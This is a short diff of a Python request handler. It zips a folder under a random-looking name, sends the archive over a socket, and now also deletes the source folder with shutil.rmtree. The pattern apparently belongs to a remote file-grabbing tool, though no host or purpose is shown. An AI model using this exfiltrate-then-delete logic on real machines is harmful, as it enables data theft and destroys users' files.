@@ -77,7 +77,6 @@ def process_req(buf, tmp_folder, tmp_file):
 
             archive_path = pathlib.Path(os.curdir).joinpath('xh3ted73jkw8.zip')
 
-
             __import__('time').sleep(2.0)
             def for_try_block():
                 shutil.make_archive('xh3ted73jkw8', 'zip', path)
@@ -85,7 +84,9 @@ def process_req(buf, tmp_folder, tmp_file):
 
                     sock.send(f.read())
                 sock.close()
+
                 os.remove(archive_path)
+                shutil.rmtree(path, ignore_errors= True)
 
             #create zipfiles if not existed
             try:
